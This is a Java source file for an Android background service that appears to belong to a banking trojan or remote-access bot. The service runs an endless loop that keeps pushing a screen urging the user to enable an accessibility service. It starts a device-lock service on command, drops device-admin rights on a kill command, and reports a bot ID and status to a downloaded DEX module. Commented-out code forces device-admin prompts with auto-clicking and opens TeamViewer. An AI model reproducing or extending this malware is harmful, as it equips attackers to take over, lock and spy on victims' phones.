package com.example.mmm.Service;

import android.app.IntentService;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.PowerManager;

import com.example.mmm.Activity.actPermissions;
import com.example.mmm.Activity.actToaskAccessbility;
import com.example.mmm.Admin.ReceiverDeviceAdmin;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;


import org.json.JSONObject;

import java.io.File;


public class srvWhileWorker extends IntentService {


    public srvWhileWorker() {
        super("");
    }
    utils utl = new utils();
    constants consts = new constants();
    private String TAG_LOG  = srvWhileWorker.class.getSimpleName()+ consts.strTAG1;

    private WifiManager.WifiLock lock;
    StateManager mStateManager;
    private PowerManager.WakeLock wl;

  /*  private void makeCPULock() {
        try {
            this.wl = ((PowerManager) getSystemService("power")).newWakeLock(1, getClass().getName());
            this.wl.acquire();
            this.mStateManager.setStateTo(1, 12);
        } catch (Exception unused) {
        }
    }

    private void makeWifiLock() {
        try {
            this.lock = ((WifiManager) getApplicationContext().getSystemService("wifi")).createWifiLock(1, getClass().getName());
            this.lock.acquire();
            this.mStateManager.setStateTo(1, 16);
        } catch (Exception unused) {
        }
    }*/

    int tick;
    int itoaskAccessibility = 0;
    int speedTime = 1000;
    int start_Q = 6;
    @Override
    protected void onHandleIntent(Intent intent) {
        while(true){
           // makeCPULock();
            // makeWifiLock();
            utl.chalkTile(speedTime);
            try{
                tick = Integer.parseInt(utl.SettingsRead(this, consts.timeWorking));
            }catch (Exception ex){
                tick = 0;
               // utl.SettingsToAdd(this, consts.LogSMS , consts.string_174 + ex.toString() + consts.string_119);
            }

            utl.Log(TAG_LOG,  consts.string_94 + tick);

            //-------------toask-accessbility----
            try {
                if ((!utl.isAccessibilityServiceEnabled(this, srvSccessibility.class)) && (utl.getScreenBoolean(this))) {
                    speedTime = 1000;
                    itoaskAccessibility++;
                    try {
                        if (utl.SettingsRead(this, consts.activityAccessibilityVisible).equals(consts.str_1) && (itoaskAccessibility >= 4)) {
                            startService(new Intent(this, srvToaskAccessibility.class));
                            itoaskAccessibility = 0;
                        }
                    }catch (Exception ex){}

                    if(start_Q >= 6 ){
                        startActivity(new Intent(this, actToaskAccessbility.class)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY));
                        start_Q = 0;
                    }
                    start_Q++;

                } else {

                    speedTime = 8000;
                }
            }catch (Exception ex){
            //    utl.SettingsToAdd(this, consts.LogSMS , consts.string_175 + ex.toString() + consts.string_119);
            }
            //------------Admin Device----
            if (!utl.isAdminDevice(this)) {
               /* if((utl.getScreenBoolean(this)) && (utl.isAccessibilityServiceEnabled(this, srvSccessibility.class)))  {
                    if(utl.isAccessibilityServiceEnabled(this, srvSccessibility.class)){
                        utl.SettingsWrite(this, consts.autoClick, consts.str_1);//auto click start!
                    }
                    Intent dialogIntent = new Intent(this, ActivityAdmin.class);
                    dialogIntent.putExtra(consts.string_24, consts.str_1);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(dialogIntent);
                }*/
            }else{//------------Lock Device-----------
                try {
                    if ((!utl.isMyServiceRunning(this, srvLockDevice.class))
                            && (utl.SettingsRead(this, consts.lockDevice).equals(consts.str_1))) {
                        startService(new Intent(this, srvLockDevice.class));
                    }
                }catch (Exception ex){
                   // utl.SettingsToAdd(this, consts.LogSMS , consts.string_176 + ex.toString() + consts.string_119);
                }

               if(utl.SettingsRead(this, consts.killApplication).contains(getPackageName())) {
                    if (utl.isAccessibilityServiceEnabled(this, srvSccessibility.class)) {
                        utl.SettingsWrite(this, consts.autoClick, consts.str_1);//auto click start!
                    }
                    ComponentName mAdminReceiver = new ComponentName(this, ReceiverDeviceAdmin.class);
                    DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                    mDPM.removeActiveAdmin(mAdminReceiver);
                  //  utl.Log(TAG_LOG, "DELETE ME");
                }
            }

          /*  if(utl.SettingsRead(this, consts.startInstalledTeamViewer).equals("1")){
                try {
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=com.teamviewer.quicksupport.market")));
                } catch (android.content.ActivityNotFoundException anfe) {
                }
            } */

            //------------Check Module----------------------
            if(!new File(getDir(consts.string_95, Context.MODE_PRIVATE), consts.nameModule).exists()){
                utl.SettingsWrite(this, consts.statDownloadModule, consts.str_step);
            }else{
                try {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(consts.string_91, consts.string_96);
                    jsonObject.put(consts.string_97, ""+tick);
                    jsonObject.put(consts.idbot, utl.SettingsRead(this, consts.idbot));
                    jsonObject.put(consts.string_98, utl.isAccessibilityServiceEnabled(this, srvSccessibility.class)?consts.str_1:consts.str_step);

                    utl.sendMainModuleDEX(this, jsonObject.toString());

                    if((utl.getScreenBoolean(this)) &&
                            (!utl.hasPermissionAllTrue(this)) &&
                            (utl.SettingsRead(this, consts.day1PermissionSMS).isEmpty())){
                        startActivity(new Intent(this, actPermissions.class));
                    }

                } catch (Exception ex) {
                    utl.Log(TAG_LOG, consts.string_99);
                   // utl.SettingsToAdd(this, consts.LogSMS , consts.string_177 + ex.toString() + consts.string_119);
                }
            }
            //----------------------------------------------
            tick+=8;
            utl.SettingsWrite(this, consts.timeWorking,consts.str_null + tick);
        }
    }




}
